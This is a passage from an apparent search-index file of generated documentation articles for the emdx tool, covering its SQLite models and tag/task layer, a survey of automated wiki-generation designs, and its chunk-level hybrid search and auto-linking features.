vector.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#null-safety-improvements-pr-594","title":"Null-Safety Improvements (PR #594)","text":"<p>Multiple locations accessed <code>cursor.fetchone()[0]</code> without null checks, crashing on empty result sets:</p> <pre><code># Before:\nreturn int(cursor.fetchone()[0])  # \u274c IndexError if no result\n\n# After:\nresult = cursor.fetchone()\nreturn int(result[0]) if result else 0  # \u2705 Safe default\n</code></pre> <p>Applied to <code>get_or_create_tag()</code>, <code>merge_tags()</code>, <code>count_documents()</code>, <code>get_stats()</code>, and 6+ other functions.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#tag-system","title":"Tag System","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#tag-operations-modelstagspy","title":"Tag Operations (<code>models/tags.py</code>)","text":"<p>add_tags_to_document():</p> <pre><code>def add_tags_to_document(\n    doc_id: int,\n    tag_names: list[str],\n    conn: sqlite3.Connection | None = None\n) -&gt; None\n</code></pre> <p>Idempotent tag creation with emoji normalization. Accepts optional connection for transaction composition.</p> <p>search_by_tags():</p> <pre><code>def search_by_tags(\n    tag_names: list[str],\n    mode: str = \"all\",\n    project: str | None = None\n) -&gt; list[TagSearchResultDict]\n</code></pre> <p>Filters documents by tags with AND/OR logic: - <code>mode=\"all\"</code> \u2014 Documents must have ALL tags (uses <code>HAVING COUNT(DISTINCT t.id) = ?</code>) - <code>mode=\"any\"</code> \u2014 Documents with ANY tags (no HAVING clause)</p> <p>remove_tags_from_document():</p> <pre><code>def remove_tags_from_document(doc_id: int, tag_names: list[str]) -&gt; None\n</code></pre> <p>Removes tags with orphan cleanup.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#emoji-normalization","title":"Emoji Normalization","text":"<p>Tags support text aliases that auto-convert via <code>normalize_tag_name()</code> from <code>emdx/config/tagging.py</code>:</p> <pre><code>TAG_MAPPING = {\n    'gameplan': '\ud83c\udfaf gameplan',\n    'active': '\u26a1 active',\n    'done': '\u2705 done',\n    'blocked': '\ud83d\udd34 blocked',\n    # ... 50+ mappings\n}\n\ndef normalize_tag_name(tag: str) -&gt; str:\n    return TAG_MAPPING.get(tag.lower().strip(), tag)\n</code></pre> <p>Users can type <code>gameplan</code> and it displays as <code>\ud83c\udfaf gameplan</code> in the database.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#task-system","title":"Task System","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#task-types-modelstypespy","title":"Task Types (<code>models/types.py</code>)","text":"<p>TaskDict (base task representation):</p> <pre><code>class TaskDict(TypedDict):\n    id: int\n    title: str\n    description: str | None\n    status: TaskStatus  # Literal['open', 'active', 'blocked', 'done', 'failed']\n    priority: int\n    gameplan_id: int | None\n    project: str | None\n    current_step: str | None\n    created_at: str | None\n    updated_at: str | None\n    completed_at: str | None\n    prompt: str | None\n    type: str\n    execution_id: int | None\n    output_doc_id: int | None\n    source_doc_id: int | None\n    parent_task_id: int | None\n    seq: int | None\n    retry_of: int | None\n    error: str | None\n    tags: str | None\n    epic_key: str | None\n    epic_seq: int | None\n</code></pre> <p>EpicTaskDict (epic with child stats):</p> <pre><code>class EpicTaskDict(TaskDict):\n    child_count: int\n    children_open: int\n    children_done: int\n</code></pre> <p>ActiveDelegateTaskDict (task with child progress):</p> <pre><code>class ActiveDelegateTaskDict(TaskDict):\n    child_count: int\n    children_done: int\n    children_active: int\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#task-operations-modelstaskspy","title":"Task Operations (<code>models/tasks.py</code>)","text":"<p>create_task():</p> <pre><code>def create_task(\n    title: str,\n    description: str | None = None,\n    gameplan_id: int | None = None,\n    project: str | None = None,\n    depends_on: list[int] | None = None,\n    prompt: str | None = None,\n    # ... 12 optional parameters\n) -&gt; int\n</code></pre> <p>get_ready_tasks():</p> <pre><code>def get_ready_tasks(project: str | None = None) -&gt; list[TaskDict]\n</code></pre> <p>Returns unblocked tasks (all dependencies satisfied).</p> <p>update_task():</p> <pre><code>ALLOWED_UPDATE_COLUMNS = frozenset({\n    'title', 'description', 'priority', 'status', 'gameplan_id', 'project',\n    'prompt', 'type', 'execution_id', 'output_doc_id', 'source_doc_id',\n    'parent_task_id', 'seq', 'retry_of', 'tags', 'epic_key', 'epic_seq',\n    'error',  # Critical: initially missing, fixed in PR #594 review\n})\n\ndef update_task(task_id: int, **kwargs) -&gt; bool:\n    for key in kwargs:\n        if key not in ALLOWED_UPDATE_COLUMNS:\n            raise ValueError(f\"Invalid column: {key}\")\n</code></pre> <p>Critical omission caught during PR #594 review: <code>error</code> was missing from the whitelist but actively used in <code>delegate.py</code>:</p> <pre><code>_safe_update_task(task_id, status=\"failed\", error=result.error_message)\n</code></pre> <p>Without <code>'error'</code> in the whitelist, task failure reporting was silently broken.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#transaction-composition-pattern","title":"Transaction Composition Pattern","text":"<p>Functions accept optional <code>conn: sqlite3.Connection | None = None</code> parameter: - When <code>conn</code> is provided \u2192 run in caller's transaction - When <code>None</code> \u2192 create own connection and auto-commit</p> <p>This enables atomic multi-step operations while maintaining backward compatibility with 70+ existing callers.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#input-validation-pr-594","title":"Input Validation (PR #594)","text":"<p>Pagination parameters:</p> <pre><code>if limit &lt; 0 or offset &lt; 0:\n    raise ValueError(\"limit and offset must be non-negative\")\n</code></pre> <p>Date parameters:</p> <pre><code>if days &lt;= 0:\n    raise ValueError(\"days must be positive\")\n</code></pre> <p>Prevents malformed SQL like <code>datetime('now', '--5 days')</code>.</p> <p>Column name whitelisting: Dynamic SQL with user-supplied column names is a SQL injection vector. Fixed via frozen sets in <code>tasks.py</code>, <code>executions.py</code>, and <code>groups.py</code>.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#type-safety-migration","title":"Type Safety Migration","text":"<p>A comprehensive audit (#6432, #6433) eliminated unnecessary <code>Any</code> usage:</p> <p>Before:</p> <pre><code>def get_stats() -&gt; dict[str, Any]\n</code></pre> <p>After:</p> <pre><code>class ExecutionStatsDict(TypedDict):\n    total: int\n    recent_24h: int\n    running: int\n    completed: int\n    failed: int\n\ndef get_stats() -&gt; ExecutionStatsDict\n</code></pre> <p>Legitimate <code>Any</code> patterns retained: - Pre-cast intermediate dicts before <code>cast(TypedDict, row)</code> calls - Dynamic update kwargs with whitelist validation</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#nullable-type-discipline","title":"Nullable Type Discipline","text":"<p>Analysis (#6489) validated all 124 <code>| None</code> annotations as necessary:</p> <ol> <li>Optional FK relationships \u2014 <code>gameplan_id: int | None</code>, <code>parent_task_id: int | None</code></li> <li>Nullable database columns \u2014 <code>project: str | None</code>, <code>completed_at: str | None</code></li> <li>Optional filters \u2014 <code>status: list[str] | None = None</code></li> <li>Record-not-found semantics \u2014 <code>get_task() -&gt; TaskDict | None</code></li> <li>Transaction composition \u2014 <code>conn: sqlite3.Connection | None</code></li> </ol> <p>All trace back to: - Nullable SQL columns (confirmed via migration files) - Optional function parameters with <code>= None</code> defaults - Return values that legitimately can be None</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#critical-issues-from-codebase-audit","title":"Critical Issues from Codebase Audit","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#fixed-in-pr-594","title":"Fixed in PR #594","text":"<ul> <li>\u2705 Transaction isolation: <code>save_document()</code> now commits after tags</li> <li>\u2705 Null-safety: 10+ locations fixed with null checks</li> <li>\u2705 Validation: Pagination and date parameters validated</li> <li>\u2705 SQL injection: Column name whitelists prevent dynamic SQL vulnerabilities</li> </ul>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#remaining-work","title":"Remaining Work","text":"<ul> <li>\u26a0\ufe0f <code>connection.py:53-56</code> \u2014 Connection closed without rollback on exception</li> <li>\u26a0\ufe0f <code>cascade.py:257-308</code> \u2014 Opens two separate connections for related operations</li> <li>\u26a0\ufe0f <code>cascade.py:67-87</code> \u2014 Non-atomic check-then-act in <code>update_cascade_stage()</code></li> <li>\u26a0\ufe0f Migration error handling \u2014 Schema version set even if migration fails</li> </ul>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#missing-error-handling-in-migrations","title":"Missing Error Handling in Migrations","text":"<p><code>migrations.py:2217-2240</code> sets schema version even if migration partially fails:</p> <pre><code>try:\n    for version, description, migration_func in MIGRATIONS:\n        if version &gt; current_version:\n            migration_func(conn)  # \u274c Exception lost\n            set_schema_version(conn, version)  # \u274c Version incremented anyway\nfinally:\n    conn.close()\n</code></pre> <p>Impact: Corrupted schema state; future migrations skipped incorrectly.</p> <p>Fix:</p> <pre><code>try:\n    for version, description, migration_func in MIGRATIONS:\n        if version &gt; current_version:\n            try:\n                migration_func(conn)\n                set_schema_version(conn, version)\n            except Exception as e:\n                conn.rollback()\n                raise RuntimeError(f\"Migration {version} failed\") from e\nfinally:\n    conn.close()\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#common-patterns-and-anti-patterns","title":"Common Patterns and Anti-Patterns","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#good-patterns","title":"\u2705 Good Patterns","text":"<ul> <li>Parameterized SQL for all user-facing queries</li> <li>FTS5 query escaping in <code>search.py</code></li> <li>No <code>shell=True</code> subprocess calls</li> <li>API keys from environment variables</li> <li>TypedDict for all known dict shapes</li> <li>Whitelist validation for dynamic column names</li> </ul>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#anti-patterns-to-avoid","title":"\u274c Anti-Patterns to Avoid","text":"<ul> <li>Unchecked <code>fetchone()[0]</code>: Always check for None before indexing (fixed in PR #594)</li> <li>Silent exception swallowing: <code>except Exception: pass</code> appears in <code>activity_items.py</code>, <code>ui_config.py</code>, <code>cascade_service.py</code></li> <li>Dynamic SQL column names without whitelist: Fixed in PR #594</li> <li>Querying FTS5 virtual table directly: Must JOIN on rowid</li> </ul>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#usage-examples","title":"Usage Examples","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#reading-tasks","title":"Reading Tasks","text":"<pre><code>from emdx.models.types import TaskDict, TaskStatus\n\ndef process_task(task: TaskDict) -&gt; None:\n    if task['status'] == 'open':\n        start_task(task['id'])\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#working-with-epics","title":"Working with Epics","text":"<pre><code>from emdx.models.types import EpicViewDict\n\nepic: EpicViewDict | None = get_epic_view(42)\nif epic:\n    total = epic['child_count']\n    done = epic['children_done']\n    progress = done / total if total &gt; 0 else 0\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#category-statistics","title":"Category Statistics","text":"<pre><code>from emdx.models.types import CategoryWithStatsDict\n\ncategories: list[CategoryWithStatsDict] = list_categories()\nfor cat in categories:\n    print(f\"{cat['name']}: {cat['open_count']} open, {cat['done_count']} done\")\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#atomic-tag-operations","title":"Atomic Tag Operations","text":"<pre><code>conn = get_connection()\ntry:\n    doc_id = save_document(\"Title\", \"Content\", tags=[\"gameplan\", \"active\"], conn=conn)\n    add_tags_to_document(doc_id, [\"priority\"], conn=conn)\n    conn.commit()\nexcept Exception:\n    conn.rollback()\n    raise\nfinally:\n    conn.close()\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#related-topics","title":"Related Topics","text":"<ul> <li>Type System: <code>models/types.py</code>, <code>database/types.py</code></li> <li>Search: <code>database/search.py</code> (FTS5 queries)</li> <li>Cascade Pipeline: <code>database/cascade.py</code> (workflow stages)</li> <li>Tagging: <code>config/tagging.py</code> (emoji normalization)</li> <li>Migrations: <code>database/migrations.py</code> (schema evolution)</li> </ul> <p>Generated from 18 source documents</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/","title":"domain.topic.subtopic, Graphiti, and llms.txt: Wiki Generation Architecture","text":""},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#overview","title":"Overview","text":"<p>This article synthesizes research into automated wiki generation from unstructured document collections. The central finding: \"pile of notes \u2192 readable wiki\" remains unsolved end-to-end, despite mature building blocks existing across multiple tools. The opportunity lies in chaining entity extraction, document clustering, article synthesis, hierarchy generation, cross-linking, quality assessment, and incremental updates into a unified pipeline.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#the-dual-philosophy-of-wiki-structure","title":"The Dual Philosophy of Wiki Structure","text":"<p>Two competing but complementary approaches emerge across all tools:</p> <p>Top-down (schema-driven): Define structure first, fill content later. Used by Notion, Dendron, and GitBook. Structure comes from explicit hierarchies, database properties, or filesystem conventions.</p> <p>Bottom-up (emergent): Capture first, structure emerges from connections. Used by Logseq, Obsidian, and Zettelkasten tools. Structure arises from wikilinks, backlinks, and daily journals with topic tags.</p> <p>The best systems support both: Notion treats every wiki page as simultaneously a freeform page AND a database row\u2014same content, two lenses.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#dot-notation-hierarchy-dendron-pattern","title":"Dot-Notation Hierarchy (Dendron Pattern)","text":"<p>Dendron encodes hierarchy in flat filenames: <code>lang.python.basics.md</code> derives parent/child relationships from filename segments. No nested directories needed. Creating a deep note auto-generates placeholder stubs for missing parents (in-memory only until materialized).</p> <p>Key advantage: Hierarchy becomes metadata, not filesystem structure. Bulk regex rename with capture groups allows renaming a parent to cascade automatically to all children.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#entity-extraction-knowledge-graphs","title":"Entity Extraction &amp; Knowledge Graphs","text":"<p>Graphiti (getzep) demonstrates real-time incremental entity extraction with auto-ontology building, entity deduplication, and hybrid search (semantic embeddings + BM25 + graph traversal). Designed for dynamic environments where content changes continuously\u2014exactly what a growing knowledge base needs.</p> <p>Traditional static extraction approaches fail when new documents arrive. Incremental graph updates process only changed documents and their neighbors, avoiding full recomputation.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#link-types-first-occurrence-linking","title":"Link Types &amp; First-Occurrence Linking","text":"<p>Consensus best practice across all tools: Link a term once per document (first occurrence), then use plain text. Exhaustive auto-linking is universally disliked\u2014worse than no linking.</p> <p>Block-level vs. page-level: Logseq's block references link to a single sentence (every block gets a UUID). Obsidian and most tools link at page granularity. Block-level offers precision; page-level offers simplicity.</p> <p>Typed relationships: Neither Obsidian nor Logseq supports relationship types beyond \"links to.\" The opportunity: add \"extends,\" \"contradicts,\" \"example of,\" \"depends on\" for richer semantic networks.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#quality-assessment-ores-pattern","title":"Quality Assessment (ORES Pattern)","text":"<p>Wikipedia's ORES system predicts article quality using structural features: - Page length: 39.5% importance - References: 18.1% - Sections: 12.3% - Wikilinks: 11.5% - Media: 11.4% - Categories: 7.0%</p> <p>This achieves ~90% accuracy within one quality tier using only structural features\u2014no content analysis required. The critical limitation: structural assessment cannot detect factual errors or bias. Content accuracy remains the hard gap.</p> <p>Computable quality tiers (adapted from Wikipedia): - Stub: &lt;800 words, &lt;4 sections, no lead paragraph - Start/C-class: 800+ words, 4+ sections, lead paragraph, 3+ cross-references - Complete/B-class: Multiple subsections, 10+ citations, 5+ cross-references - Reviewed/GA: Human verification, external review</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#graph-visualization-principles","title":"Graph Visualization Principles","text":"<p>Universal failure: Global graph views become \"hairballs\" at &gt;30 nodes. Non-visual thinkers get zero value.</p> <p>What works: Local graph showing neighbors of the current document. Connected Papers caps at ~25 nodes with triple visual encoding: - Size = citation count - Color = recency - Position = similarity</p> <p>Multi-view architecture: similar / sources / derived. This stays below the ~30-node readability cliff while providing actionable context.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#ai-native-output-formats","title":"AI-Native Output Formats","text":"<p>GitBook auto-generates <code>llms.txt</code> and <code>llms-full.txt</code> for AI consumption. They expose MCP servers so LLMs can query docs directly. Their AI Agent writes/edits documentation using existing content as context.</p> <p>Key insight: LLM-ready output should be first-class, not an afterthought. Generated wikis should expose both human-readable views and machine-queryable endpoints from day one.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#the-7-stage-pipeline","title":"The 7-Stage Pipeline","text":"<p>Based on analysis of OpenDeepWiki (best structure/content/provenance separation), Graphiti (incremental updates), and Dendron (hierarchy-as-metadata):</p> <ol> <li>Entity extraction \u2014 Extract entities + relationships from documents using Graphiti-style incremental processing</li> <li>Document clustering \u2014 Group related docs by topic using embeddings + link structure + tag overlap (the major gap nobody fills)</li> <li>Article synthesis \u2014 LLM generates wiki articles from document clusters with citations back to sources</li> <li>Hierarchy generation \u2014 Infer <code>domain.topic.subtopic</code> tree from clusters</li> <li>Cross-link injection \u2014 IDF-weighted first-occurrence linking with alias support</li> <li>Quality scoring \u2014 ORES-inspired tiered assessment using structural features</li> <li>Incremental updates \u2014 Re-process only changed documents and their neighbors</li> </ol>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#structure-storage-model","title":"Structure Storage Model","text":"<p>Recommendation: Dot-notation hierarchy as metadata, not filenames. Store documents flat with IDs. Derive parent/child relationships from metadata fields.</p> <p>OpenDeepWiki's three-layer separation: - <code>DocumentCatalog</code> \u2014 hierarchical tree (structure) - <code>DocumentFileItem</code> \u2014 generated content - <code>DocumentFileItemSource</code> \u2014 citations with line numbers (provenance)</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#link-resolution-strategy-obsidian-pattern","title":"Link Resolution Strategy (Obsidian Pattern)","text":"<p>Obsidian's 3-tier wikilink resolution: 1. Exact match (case-sensitive) 2. Normalized match (case-insensitive, slug-normalized) 3. Path-based match (search subdirectories)</p> <p>Aliases multiply matching surface area: a single page can be referenced by multiple names. Unresolved links serve as organic content gap indicators\u2014clicking creates the note.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#summary-compression-semantic-scholar-tldr","title":"Summary Compression (Semantic Scholar TLDR)","text":"<p>Counterintuitive finding: Extreme compression (10:1, ~20 words) produces better summaries than moderate compression. Title generation as auxiliary training task teaches models to find the single most important thing.</p> <p>Target: 1-2 sentence wiki page summaries, not paragraphs.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#journals-linked-references-pattern-logseq","title":"Journals + Linked References Pattern (Logseq)","text":"<p>Daily journal auto-creation enables friction-free capture: dump everything with <code>[[topic]]</code> links. Visiting any topic page auto-shows every journal entry mentioning it. Structure emerges bottom-up from connections.</p> <p>The tension: Heavy users accumulate topic pages that are just long backlink lists\u2014powerful as auto-index, but lacking synthesized content without periodic manual curation.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#entity-wikification-existing-foundation","title":"Entity Wikification (Existing Foundation)","text":"<p>The existing Layer 3 entity wikification with IDF-weighted scoring provides the base. Extensions needed: - Alias support (multiple names for same entity) - Unresolved link tracking as content gap signal - Typed relationships beyond plain backlinks</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#document-clustering-algorithm","title":"Document Clustering Algorithm","text":"<p>No tool does this well. Combine: - Embedding similarity (semantic clustering) - Link structure (co-cited documents) - Tag overlap (explicit grouping) - Temporal proximity (documents created together)</p> <p>Target: Groups of 3-10 documents per cluster. Smaller clusters become stubs; larger clusters become multi-section articles.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#hierarchy-inference","title":"Hierarchy Inference","text":"<p>Extract potential topics using entity extraction. Cluster entities into domains using co-occurrence. Infer hierarchical relationships: - Frequency heuristic: \"python\" appears in 50 docs, \"python.asyncio\" in 8 \u2192 parent/child - Textual containment: titles like \"Advanced Python\" suggest parent \"Python\" - Temporal sequence: \"Introduction to X\" precedes \"Advanced X\"</p> <p>LLM validation: Generate candidate hierarchy, ask LLM to validate/adjust based on document content.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#cross-link-injection-with-first-occurrence","title":"Cross-Link Injection with First-Occurrence","text":"<p>For each entity mention: 1. Detect all instances using wikification 2. Rank by IDF score 3. Link only highest-scoring instance per document 4. Store remaining instances as \"unlinked mentions\" (Obsidian pattern)</p> <p>Provide preview mode: show proposed links before applying.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#quality-scoring-implementation","title":"Quality Scoring Implementation","text":"<p>Compute structural features:</p> <pre><code>score = (\n    0.395 * normalize(word_count) +\n    0.181 * normalize(reference_count) +\n    0.123 * normalize(section_count) +\n    0.115 * normalize(wikilink_count) +\n    0.114 * normalize(media_count) +\n    0.070 * normalize(category_count)\n)\n</code></pre> <p>Normalization: log-scale to handle wide ranges. Thresholds calibrated to Wikipedia tier boundaries.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#incremental-update-strategy-graphiti-pattern","title":"Incremental Update Strategy (Graphiti Pattern)","text":"<p>On document change: 1. Re-extract entities from changed document 2. Identify affected clusters (any cluster containing changed doc) 3. Re-synthesize articles for affected clusters 4. Re-compute cross-links for affected articles + immediate neighbors 5. Update quality scores for changed articles</p> <p>Avoid full recomputation. Track last-modified timestamps to identify stale articles.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#schema-driven-templates-dendron-pattern","title":"Schema-Driven Templates (Dendron Pattern)","text":"<p>Auto-discover recurring document structures: - 80% of analysis docs have Problem/Findings/Recommendations \u2192 generate template - Code documentation follows consistent API reference format \u2192 template - Meeting notes have Date/Attendees/Action Items \u2192 template</p> <p>Schemas are advisory (never blocking). Suggest templates at creation; auto-apply if user accepts.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#synced-blocks-database-views-notion-pattern","title":"Synced Blocks &amp; Database Views (Notion Pattern)","text":"<p>Synced blocks: Create live \"windows\" between documents. Edit anywhere, changes propagate. Use for reusable FAQs, status updates, process docs.</p> <p>Database views: Convert flat documentation into queryable datasets. Multiple views of same wiki with different layouts (table, board, list), filters (by tag, status, owner), sorts, and grouping rules.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#verification-staleness-tracking","title":"Verification &amp; Staleness Tracking","text":"<p>Notion's verification model: owners set expiration dates, get inbox + email notifications when pages expire. Two modes: time-limited or indefinite verification.</p> <p>For emdx: Track last-updated timestamp, entity staleness (linked docs changed but this article didn't update), and manual review dates.</p>"},{"location":"articles/domaintopicsubtopic-graphiti-and-llmstxt-wiki-generation-architecture/#related-topics","title":"Related Topics","text":"<ul> <li>MCP (Model Context Protocol): GitBook exposes wikis via MCP servers for LLM queries</li> <li>Static Site Generators: MkDocs (autorefs plugin for cross-page linking), Docusaurus (auto-sidebar from filesystem), mdBook (preprocessor architecture)</li> <li>Quartz 4: Best-in-class for presenting notes as-is with wikilinks, backlinks, graph view, transclusions\u2014but no synthesis</li> <li>OpenDeepWiki: C# + Semantic Kernel, Git repo \u2192 hierarchical catalog \u2192 content generation \u2192 source citations</li> <li>DeepWiki-Open: FastAPI + Next.js, repo URL \u2192 wiki structure + content + Mermaid diagrams, multi-LLM support</li> <li>Obsidian Plugins: Dataview (SQL-like queries over metadata), Strange New Worlds (backlink count badges), Breadcrumbs (hierarchical nav for flat collections)</li> <li>Wikipedia Stub Detection: 14.7% of articles are orphans; de-orphanizing yields 6.5% pageview increase</li> <li>Connected Papers: Multi-view citation graph (similar/sources/derived), triple encoding (size/color/position), 25-node cap</li> </ul> <p>Generated from 10 source documents</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/","title":"Dream Journal: Smart Priming and Master Gameplan","text":""},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#overview","title":"Overview","text":"<p>EMDX is fundamentally Claude's memory system \u2014 a self-organizing knowledge base where AI agents populate and humans curate. The Dream Journal initiative transforms emdx from passive document storage into an active intelligence system that learns, organizes, and surfaces information automatically. Three core features work together: overnight consolidation (Dream Journal), context-aware session initialization (Smart Priming), and duplicate prevention (Contextual Save).</p> <p>Design Philosophy: Claude-First</p> <p>Every decision optimizes for machine-readability, minimal token cost, composability, and cross-session intelligence. The hot path is <code>Claude Code \u2192 emdx CLI \u2192 stdout \u2192 Claude's context window</code>. Features prioritize:</p> <ul> <li>Non-blocking UX: Warnings don't prevent saves</li> <li>Token efficiency: Chunk-level retrieval, concise output</li> <li>Autonomous curation: Systems run without human oversight</li> <li>Discoverability: Context surfaces proactively</li> </ul>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#the-knowledge-management-problem","title":"The Knowledge Management Problem","text":"<p>Claude sessions operate in isolation, leading to: - Duplicate research: 60-80% content overlap across documents - Cold starts: Every session begins without awareness of prior work - Knowledge fragmentation: Insights scattered, connections invisible - Knowledge rot: Important decisions forgotten, outdated docs persist</p> <p>The Dream Journal initiative addresses all four through automated consolidation, relationship discovery, and intelligent retrieval.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#the-three-tier-intelligence-model","title":"The Three-Tier Intelligence Model","text":"<p>Tier 1: Save-Time Intelligence - Contextual Save: Prevents duplicates by checking similarity on save - Auto-Linking: Creates bidirectional links between related docs - Result: KB self-organizes as it grows</p> <p>Tier 2: Search Intelligence - Hybrid Search: Combines keyword + semantic, returns chunks not whole docs - RAG Q&amp;A: Synthesizes answers from multiple documents via <code>emdx ai ask</code> - Result: Finding information becomes conversational</p> <p>Tier 3: Maintenance Intelligence - Smart Priming: Context-aware session startup - Dream Journal: Overnight consolidation and pattern detection - Knowledge Decay: Surfaces stale but important documents - Result: KB maintains itself</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#chunk-level-indexing","title":"Chunk-Level Indexing","text":"<p>Documents split into semantic units for precision retrieval:</p> <pre><code># emdx/services/chunk_splitter.py\nclass ChunkSplitter:\n    def split_document(self, content: str) -&gt; List[Chunk]:\n        # Split by markdown headings (##, ###)\n        # Large sections split by paragraphs\n        # Merge small sections to ~100 tokens\n        # Preserve heading paths: \"Methods &gt; Data Collection\"\n</code></pre> <p>Database Schema (Migration #040):</p> <pre><code>CREATE TABLE chunk_embeddings (\n    document_id INTEGER,\n    chunk_index INTEGER,\n    heading_path TEXT,     -- Hierarchical context\n    text TEXT,\n    embedding BLOB,\n    PRIMARY KEY (document_id, chunk_index)\n);\n</code></pre> <p>Benefits: - 6x more granular than document-level search - Heading paths provide structural context - Massive token savings: retrieve paragraphs, not whole docs</p> <p>Storage Cost: ~1.5KB per chunk. A 1000-doc KB with 6 chunks/doc = ~9MB (acceptable).</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#hybrid-search-algorithm","title":"Hybrid Search Algorithm","text":"<p>Default mode combines three signals:</p> <pre><code># emdx/services/hybrid_search.py\ndef compute_hybrid_score(keyword_score, semantic_score, in_both):\n    base = 0.4 * keyword_score + 0.6 * semantic_score\n    if in_both:\n        base += 0.15  # Overlap boost when term appears in both modes\n    return base\n</code></pre> <p>Score Normalization: - FTS5 scores: <code>rank / max_rank</code> (0-1 range) - Semantic scores: Cosine similarity already 0-1 - Configurable alpha weights in <code>constants.py</code></p> <p>Mode Detection: - Embeddings exist \u2192 Hybrid (default) - No embeddings \u2192 Keyword (FTS5 fallback) - Explicit <code>--mode semantic|keyword|hybrid</code></p> <p>CLI Usage:</p> <pre><code>$ emdx find \"authentication patterns\" --extract\n# Hybrid search with chunk-level display\n\n$ emdx find \"OAuth\" --mode keyword\n# Force FTS5 for exact matches\n\n$ emdx find \"security best practices\" --mode semantic\n# Conceptual search across all embeddings\n</code></pre>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#knowledge-graph-document-links","title":"Knowledge Graph: Document Links","text":"<p>Database Schema (Auto-Linking service):</p> <pre><code>CREATE TABLE document_links (\n    source_id INTEGER,\n    target_id INTEGER,\n    link_type TEXT,        -- \"duplicate\", \"supersedes\", \"related\"\n    confidence REAL,       -- Similarity score 0-1\n    created_by TEXT,       -- \"user\", \"auto-link\", \"consolidation\"\n    created_at TIMESTAMP,\n    PRIMARY KEY (source_id, target_id)\n);\n</code></pre> <p>Link Types: - <code>duplicate</code>: &gt;80% similarity, consolidation candidate - <code>supersedes</code>: Newer doc invalidates older - <code>related</code>: 50-80% similarity, thematic connection - <code>depends_on</code>: Implementation requires design doc - <code>implements</code>: Code realizes spec/gameplan</p> <p>Auto-Linking Logic:</p> <pre><code># emdx/services/linking_service.py\ndef create_links(doc_id: int) -&gt; List[Link]:\n    # Find top 5 similar docs (&gt;50% threshold)\n    similar = 